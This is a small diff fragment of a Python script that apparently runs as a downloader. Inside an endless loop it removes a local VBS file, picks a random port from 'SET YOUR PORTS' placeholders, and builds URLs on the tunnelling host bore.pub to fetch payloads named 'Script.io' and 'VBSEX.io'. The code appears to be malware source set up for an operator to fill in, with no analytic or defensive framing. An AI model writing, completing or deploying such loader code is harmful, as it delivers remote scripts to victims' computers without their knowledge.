@@ -39,7 +39,7 @@ while True:
         if os.path.exists(vbs_file_path):
             os.remove(vbs_file_path)
 
-        port = random.choice([SET YOUR PORTS])
+        port = random.choice([SET YOUR PORTS, SET YOUR PORTS])
 
         url1 = f"http://bore.pub:{port}/Script.io"
         url2 = f"http://bore.pub:{port}/VBSEX.io"
